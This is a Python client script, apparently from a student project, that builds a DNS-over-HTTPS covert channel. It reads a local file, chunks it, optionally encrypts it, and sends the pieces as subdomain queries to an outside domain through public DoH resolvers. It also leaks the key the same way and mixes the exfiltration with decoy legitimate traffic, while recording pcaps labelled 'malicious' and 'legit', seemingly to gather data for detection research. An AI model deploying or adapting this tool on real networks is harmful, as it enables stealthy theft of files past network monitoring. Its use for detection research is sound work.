import os
import random
import socket
import sys
import base64
import dns
from dns import resolver
import http.client
import requests
from Crypto.Cipher import AES
import hashlib
from Crypto import Random
from datetime import datetime
from pcap import Pcap
from data import LEGIT_WEBSITES,DOH_RESOLVERS
import pandas as pd
from scapy.all import *
import threading
from createCertificate import create_self_signed_cert


DNS_MAX_LEN = 512
RAW_DATA_MAX_LEN = 140
ENC_DATA_MAX_LEN = 112   #check this in the future, should work with AES enc len(data)%16=0 + 16 (Rand-Vector) = 128, suggested len - 104 , need to take in count base64_urlsafe encode.


LABEL_MAX_LEN=63
DOMAIN_MAX_LEN=255
IPV4_LEN=4
IPV6_LEN=16
DNS_TYPES=['MX','CNAME','TXT','A',]
DOMAIN='.finalprojectsce2022.com'

DOMAIN_ENDS =[".net",'com','io','co']

class client():

    #fix args
    def __init__(self,adress=None,domain=None,file_name=None,path=None,*args):
        #self.sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        #self.soc=self.soc.bind(("127.0.0.1","34523"))
        self.adress = socket.gethostname()
        self.keys = []
        self.key = None
#        self.query_type = args.type
        self.pog=None
        self.client_https = requests.session()
        if domain:
            self.domain = self.check_domain(domain)
            if not self.domain:
                print("Worng Domain name ")
                exit(1)
        else:
            self.domain=DOMAIN
        # if file_name:
        #     self.pcap = Pcap(self.get_time()+file_name)
        # else:
        #     self.pcap=Pcap(self.get_time()+"_data")
        create_self_signed_cert()

    def run (self):
        pas =True
        while pas:
            #choice = random.choice(range(1,4))
            #choice2 = random.choice(range(1,2))
            try:
                choice = int(input("choose option : 1)read from file 2)send random data 3) send legit DOH 4) send legit HTTPS \n"))
                if(choice != (3 or 4 or 2)):
                    choice2 = int(input("1)send encrypt data 2)send raw data \n"))
            except Exception as ex:
                print(ex)
            if choice == 1:
                try:
                    inp = input("Enter File path: \n")
                    file =open(inp,"r")
                    data= file.read()

                except Exception as ex:
                    print (ex)
                    exit(1)
                if choice2 == 1:
                    self.save_data_new_thread(file_name="malicious_encrypted_doh_"+self.get_time(),number=10000)
                    self.share_key()
                    self.doh_ask(data=data, encrypt=True)


                elif choice2 == 2:
                    self.save_data_new_thread(file_name="malicious_raw_doh_" + self.get_time(), number=10000)
                    self.doh_ask(data=data, encrypt=False)
                    self.share_key()
                    ##self.doh_ask()
            if choice ==2:
                if choice2 ==1:
                    self.save_data_new_thread(file_name="random_mailicius_doh_" + self.get_time(), number=10000)
                    self.share_key()
                    self.doh_ask(data=None, encrypt=False)
                elif choice2 == 2 :
                    self.doh_ask(data=None, encrypt=False)
            if choice == 3 :
               # try:
                    number = int(input("Enter number of requests : \n"))
                    print(number)
                    self.save_data_new_thread("legit_doh_"+self.get_time(),10000)
                    threads =[]
                    self.legit_doh(10000)
              #  except:
                    print("worng input !!")
            if choice == 4:
                number = input("Enter number of requests : \n")
                self.save_data_new_thread("legit_https_"+self.get_time(),10000)
                self.legit_https(number)
                print('wrong number input !')


    def save_data_new_thread(self,file_name,number):
        details = (number*2,file_name)
        t = threading.Thread(target=self.save_data,args = (details,) )
        t.start()


    def save_data(self,details):
        capture = sniff(count=details[0], filter="port 443")
        capture.summary()
        wrpcap(details[1]+".pcap", capture)


    def doh_ask(self,encrypt=None,data=None,type=None,resolver=DOH_RESOLVERS['google']):
        ans = []
        if (data):
            if (len(data)>ENC_DATA_MAX_LEN and encrypt) or (len(data)>RAW_DATA_MAX_LEN and not encrypt):
                data = self.data_partition(data,encrypt)
            for dat in data:
                if encrypt:
                    dat= self.padd_message(dat)
                    dat=self.data_encrypt(dat)
                if not type:
                    type=random.choice(DNS_TYPES)
                params = {
                    'name': str(dat)+self.domain,
                    'type': type,
                    'ct': 'application/dns-json'
                }
                ans.append(self.client_https.get("https://"+resolver, params=params, cert=(os.getcwd()+'/selfsigned.crt',os.getcwd()+'/private.key')))
                print(params)
                print("\n")
        else:
            rand = 10000
            self.save_data_new_thread("Random_Doh",rand)
            for i in range(1,rand):
                data= self.random_data(encrypt)
                type = random.choice(DNS_TYPES)
                if (encrypt):
                    data = self.data_encrypt(data)
                params = {
                    'name': str(data) + self.domain,
                    'type': type,
                    'ct': 'application/dns-json'
                }
                ans.append(self.client_https.get("https://"+resolver, params=params,cert=(os.getcwd()+'/selfsigned.crt',os.getcwd()+'/private.key')))
                print(params )
                print("\n")


    def legit_https(self,number):
        for i in range(1,number):
            url = random.choice(LEGIT_WEBSITES)
            res = self.client_https.get(url)
            print (res)
            print("\n")



    def legit_doh(self,number,userAgent=None):
        headers = None
        if not userAgent:
            headers = {
                'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0',
            }
        for i in range(1,number):
            type = random.choice(DNS_TYPES)
            url = random.choice(LEGIT_WEBSITES)
            params = {
                'name': url,
                'type': type,
                'ct': 'application/dns-json'
            }
            res = self.client_https.get("https://"+DOH_RESOLVERS['google'],params=params,headers=headers,cert=(os.getcwd()+'/selfsigned.crt',os.getcwd()+'/private.key'))
            print(params)
            print("\n")



    def check_domain(self,domain):
       if len(domain) < DOMAIN_MAX_LEN:
            if (domain[0] =='.' ):
                return domain
            else:
                return domain.split('.',1)[1]
       return None



    #split data to packets by encryption , TESTED !
    def data_partition(self,data,encrypt) ->list:
        new_data = list()
        if encrypt:
            while (data):
                new_data.append(data[:ENC_DATA_MAX_LEN])
                data = data[ENC_DATA_MAX_LEN:]
        else:
            while (data):
                new_data.append(data[:RAW_DATA_MAX_LEN])
                data = data [RAW_DATA_MAX_LEN:]
        return new_data



    #make it better !!! + NOT TESTED !
    def read_file(self,path):
        file = open(path,"r")
        return file.read(1024)


    #tested
    def padd_message(self, msg):
        while len(msg) % 16 != 0:
            msg += " "
        return msg


    #tested
    def unpadd_message(self, msg):
        return msg.strip(" ")


    # not tested
    def data_encrypt(self, msg):
        msg = self.padd_message(msg)
        rand_vector = Random.get_random_bytes(16)
        enc_chiper = AES.new(self.key, AES.MODE_CBC, rand_vector)
        return rand_vector + enc_chiper.encrypt(msg.encode())


    def random_data(self,encrypt):
        if encrypt :
            size = random.choice([16,32,64,128])
        else:
            size = random.choice(range(16,RAW_DATA_MAX_LEN))
        return Random.get_random_bytes(size)


    # not tested
    def data_decrypt(self, msg):
        rand_vector = msg[:16]
        dec_chiper = AES.new(self.key, AES.MODE_CBC, rand_vector)
        return dec_chiper.decrypt(msg[16:]).decode()


    def share_key(self):
        self.key = hashlib.sha256(Random.get_random_bytes(256)).digest()

        doh_params = params = {
            'name': 'key.'+str(self.key)+self.domain,
            'type': 'A',
            'ct': 'application/dns-message',
        }
        # fix the option to choose resolver
        res = self.client_https.get("https://"+DOH_RESOLVERS['cloudflare'],params=params)


    def get_time(self):
        return str(datetime.now())


    def save_raw_data(self,data):
        pass


if __name__ == '__main__':
    cl= client()
    # data = cl.data_partition("aaaaaaaaaaaaaasssssssssssssssssssssssssssaddddddddddddddddddddddddddaaaaaaaaaaaaaaaaaaaaaaaaaaaddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaccccccccccccccccccccccccccccccccccccccccccccccccccccccccfffffffffffffffffffffffffffffffffggggggggggggggggggggggggggggggggggggghhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhttttttttttttttttttttttttt")
    # for i in data:
    #     print ("---"+i +str(len(i)))

    cl.legit_https(10)